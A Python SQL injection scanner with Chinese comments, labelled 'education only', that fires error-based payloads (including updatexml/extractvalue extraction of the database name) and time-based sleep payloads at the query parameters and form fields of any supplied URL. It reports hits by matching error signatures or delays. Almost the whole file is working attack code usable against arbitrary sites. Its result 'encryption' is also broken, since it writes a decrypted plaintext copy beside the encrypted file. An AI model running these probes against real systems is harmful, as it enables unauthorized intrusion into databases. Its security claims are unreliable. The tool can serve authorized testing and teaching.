#!/usr/bin/env python3

import argparse
import json
import time
import urllib.parse
from typing import Dict, List, Tuple

import requests
from bs4 import BeautifulSoup

# 对称加密库（用于保护敏感输出/凭据）
from cryptography.fernet import Fernet

# test website: http://testfire.net/login.jsp
# ---------------------------
# 配置：payload 列表与检测规则
# ---------------------------
# 常见错误型 SQLi payloads（短小示例）
ERROR_BASED_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' -- ",
    "') OR ('1'='1",
    "' and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- ",
    "\" and extractvalue(1,concat(0x7e,(select database()),0x7e)) -- ",
]

# 常见 time-based payloads：会在数据库端引起延迟（取决于 DBMS）
# 注意：实际有效性与目标数据库类型相关（MySQL, PostgreSQL, MSSQL, SQLite 等差异很大）
TIME_BASED_PAYLOADS = [
    "'; SELECT pg_sleep(5); --",               # PostgreSQL
    "'; WAITFOR DELAY '0:0:5'; --",            # MSSQL
    "' OR SLEEP(5) OR '1'='1",                 # MySQL
    "\" OR SLEEP(5) OR \"1\"=\"1",             # MySQL 双引号版本
]

# 常见 SQL 错误指纹，用于错误型检测（不穷尽）
SQL_ERROR_SIGS = [
    "you have an error in your sql syntax",     # MySQL
    "warning: mysql",                            # MySQL
    "unclosed quotation mark after the character string",  # MSSQL
    "quoted string not properly terminated",     # Oracle/MySQL
    "pg_query()",                                 # PostgreSQL
    "syntax error",                               # PostgreSQL
    "sqlite error",                               # SQLite
    "mysql_fetch",                                # PHP style
    "odbc",                                       # ODBC drivers
]

# 请求默认超时（s）
DEFAULT_TIMEOUT = 12


# ---------------------------
# 帮助函数
# ---------------------------
def generate_fernet_key() -> bytes:
    """
    生成一个新的 Fernet 密钥（仅示例）。
    在生产中，你应该把密钥安全地存放（例如使用密钥管理服务 KMS）。
    返回：字节类型的密钥
    """
    return Fernet.generate_key()


def encrypt_bytes(key: bytes, data_bytes: bytes) -> bytes:
    f = Fernet(key)
    return f.encrypt(data_bytes)


def decrypt_bytes(key: bytes, token: bytes) -> bytes:
    f = Fernet(key)
    return f.decrypt(token)


def is_error_in_text(text: str) -> Tuple[bool, str]:
    """
    在响应正文中查找是否含有已知 SQL 错误指纹
    返回 (found, matched_signature)
    """
    lower = text.lower()
    for sig in SQL_ERROR_SIGS:
        if sig in lower:
            return True, sig
    return False, ""


def parse_query_params(url: str) -> Dict[str, List[str]]:
    """
    解析 URL 的查询参数，返回 dict param -> [values]
    """
    parsed = urllib.parse.urlparse(url)
    return urllib.parse.parse_qs(parsed.query, keep_blank_values=True)


def build_url_with_params(base_url: str, params: Dict[str, List[str]]) -> str:
    """
    使用给定 params 构造 URL（替换查询部分）
    """
    parsed = urllib.parse.urlparse(base_url)
    new_query = urllib.parse.urlencode(
        {k: v[0] if isinstance(v, list) and len(v) > 0 else v for k, v in params.items()},
        doseq=False
    )
    built = urllib.parse.urlunparse((
        parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment
    ))
    return built


# ---------------------------
# 扫描逻辑
# ---------------------------
class ScannerResult:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.issues = []  # 列表，存储发现的issue字典

    def add_issue(self, param: str, payload: str, evidence: str, kind: str):
        self.issues.append({
            "param": param,
            "payload": payload,
            "evidence": evidence,
            "kind": kind,
            "timestamp": time.time()
        })

    def to_json(self):
        return json.dumps({
            "target": self.target_url,
            "issues": self.issues
        }, indent=2)


class WebScanner:
    def __init__(self, base_url: str, timeout: int = DEFAULT_TIMEOUT, headers: dict = None):
        self.base_url = base_url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(headers or {"User-Agent": "WebScanner/1.0 (edu-only)"})
        self.result = ScannerResult(base_url)

    def test_url_params_for_sqli(self):
        """
        如果 URL 带有查询参数，针对每个参数逐个注入尝试（GET）
        """
        params = parse_query_params(self.base_url)
        if not params:
            print("[*] No query parameters found in URL.")
            return

        print(f"[*] Testing query parameters: {list(params.keys())}")
        for p in params.keys():
            original_value = params[p][0] if params[p] else ""
            for payload in ERROR_BASED_PAYLOADS:
                # 构造注入后的参数副本
                crafted = {k: v[:] for k, v in params.items()}  # shallow copy lists
                crafted[p] = [original_value + payload]
                test_url = build_url_with_params(self.base_url, crafted)
                try:
                    resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
                    found, sig = is_error_in_text(resp.text)
                    if found:
                        evidence = f"Matched SQL error signature: {sig}"
                        print(f"[!] Possible error-based SQLi on param '{p}' with payload '{payload}'. Evidence: {sig}")
                        self.result.add_issue(p, payload, evidence, "error-based")
                except requests.RequestException as e:
                    print(f"[!] Request error testing {test_url}: {e}")

            # time-based tests
            for payload in TIME_BASED_PAYLOADS:
                crafted = {k: v[:] for k, v in params.items()}
                crafted[p] = [original_value + payload]
                test_url = build_url_with_params(self.base_url, crafted)
                try:
                    t0 = time.time()
                    resp = self.session.get(test_url, timeout=self.timeout + 10, allow_redirects=True)
                    t1 = time.time()
                    elapsed = t1 - t0
                    # 若响应时间显著高于阈值（比如 >4s），怀疑 time-based 注入成立
                    if elapsed >= 4.0:
                        evidence = f"Response delay {elapsed:.2f}s for payload {payload}"
                        print(f"[!] Possible time-based SQLi on param '{p}' with payload '{payload}'. Delay: {elapsed:.2f}s")
                        self.result.add_issue(p, payload, evidence, "time-based")
                except requests.Timeout:
                    # 超时也可能是 time-based 注入导致（或网络问题），标为可疑
                    evidence = "Request timed out (possible time-based injection or network issue)"
                    print(f"[!] Timeout when testing time-based payload on param '{p}' (payload='{payload}').")
                    self.result.add_issue(p, payload, evidence, "time-based/timeout")
                except requests.RequestException as e:
                    print(f"[!] Request error testing {test_url}: {e}")

    def find_and_test_forms(self):
        """
        抓取页面，解析表单，并对表单的每个可输入字段进行错误型与 time-based 测试。
        注意：此处提交表单时保持其他字段为空（或原始），仅演示原理。
        """
        try:
            resp = self.session.get(self.base_url, timeout=self.timeout)
        except requests.RequestException as e:
            print(f"[!] Failed to fetch page for form parsing: {e}")
            return

        soup = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form")
        if not forms:
            print("[*] No forms found on page.")
            return

        print(f"[*] Found {len(forms)} forms on page, starting tests...")
        for i, form in enumerate(forms, start=1):
            method = (form.get("method") or "get").lower()
            action = form.get("action") or self.base_url
            form_url = urllib.parse.urljoin(self.base_url, action)
            inputs = form.find_all(["input", "textarea", "select"])
            # Build a dict of fieldname -> example value (empty default)
            fields = {}
            for inp in inputs:
                name = inp.get("name")
                if not name:
                    continue
                # 忽略 file 等类型
                itype = (inp.get("type") or "").lower()
                if itype == "submit" or itype == "button" or itype == "file":
                    continue
                fields[name] = "test"  # default safe value

            print(f"[*] Testing form #{i} (method={method}, action={form_url}), fields={list(fields.keys())}")

            # 对每个字段进行注入尝试（错误型 + time-based）
            for field in list(fields.keys()):
                orig_value = fields[field]
                for payload in ERROR_BASED_PAYLOADS:
                    data = fields.copy()
                    data[field] = orig_value + payload
                    try:
                        if method == "post":
                            r = self.session.post(form_url, data=data, timeout=self.timeout)
                        else:
                            r = self.session.get(form_url, params=data, timeout=self.timeout)
                        found, sig = is_error_in_text(r.text)
                        if found:
                            ev = f"Matched SQL error signature: {sig} (form field: {field})"
                            print(f"[!] Possible error-based SQLi in form field '{field}' with payload '{payload}'. Sig: {sig}")
                            self.result.add_issue(field, payload, ev, "error-based (form)")
                    except requests.RequestException as e:
                        print(f"[!] Request exception testing form: {e}")

                # time-based
                for payload in TIME_BASED_PAYLOADS:
                    data = fields.copy()
                    data[field] = orig_value + payload
                    try:
                        t0 = time.time()
                        if method == "post":
                            r = self.session.post(form_url, data=data, timeout=self.timeout + 10)
                        else:
                            r = self.session.get(form_url, params=data, timeout=self.timeout + 10)
                        elapsed = time.time() - t0
                        if elapsed >= 4.0:
                            ev = f"Response delay {elapsed:.2f}s (form field {field})"
                            print(f"[!] Possible time-based SQLi in form field '{field}' with payload '{payload}'. Delay: {elapsed:.2f}s")
                            self.result.add_issue(field, payload, ev, "time-based (form)")
                    except requests.Timeout:
                        ev = "Request timed out (possible time-based injection or network issue)"
                        print(f"[!] Timeout testing time-based payload on form field '{field}'.")
                        self.result.add_issue(field, payload, ev, "time-based/timeout (form)")
                    except requests.RequestException as e:
                        print(f"[!] Request exception testing form time-based: {e}")

    def run_all_tests(self, find_forms: bool = True):
        """
        运行所有测试：先尝试 URL 参数注入，再尝试页面表单（如果启用）。
        """
        print("[*] Starting tests on:", self.base_url)
        self.test_url_params_for_sqli()
        if find_forms:
            self.find_and_test_forms()
        print("[*] Tests complete.")


# ---------------------------
# 主函数与 CLI
# ---------------------------
def main():
    parser = argparse.ArgumentParser(description="Simple Web Vulnerability Scanner (education only)")
    parser.add_argument("--url", required=True, help="Target URL (可包含查询参数)")
    parser.add_argument("--find-forms", action="store_true", help="Parse page and test forms")
    parser.add_argument("--output", default="scan_results.enc", help="Encrypted output file for results")
    parser.add_argument("--key-out", default="fernet.key", help="Where to save generated Fernet key (keep safe)")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="Request timeout seconds")
    args = parser.parse_args()

    # 生成或加载对称密钥（这里直接生成并保存到文件，注意权限）
    key = generate_fernet_key()
    with open(args.key_out, "wb") as f:
        f.write(key)
    print(f"[*] Generated Fernet key and saved to {args.key_out}. Keep it safe!")

    scanner = WebScanner(args.url, timeout=args.timeout)

    # 运行测试
    scanner.run_all_tests(find_forms=args.find_forms)

    # 序列化结果并加密保存
    json_bytes = scanner.result.to_json().encode("utf-8")
    enc = encrypt_bytes(key, json_bytes)
    with open(args.output, "wb") as f:
        f.write(enc)
    with open(args.output + ".org", "wb") as f:
        f.write(decrypt_bytes(key, enc))
    print(f"[*] Encrypted scan results saved to {args.output}")

    # 如果没有发现任何 issue，可输出提示
    if not scanner.result.issues:
        print("[*] No obvious issues detected by this basic scanner.")
    else:
        print(f"[!] Found {len(scanner.result.issues)} potential issues. Decrypt results with the saved key to review details.")


if __name__ == "__main__":
    main()
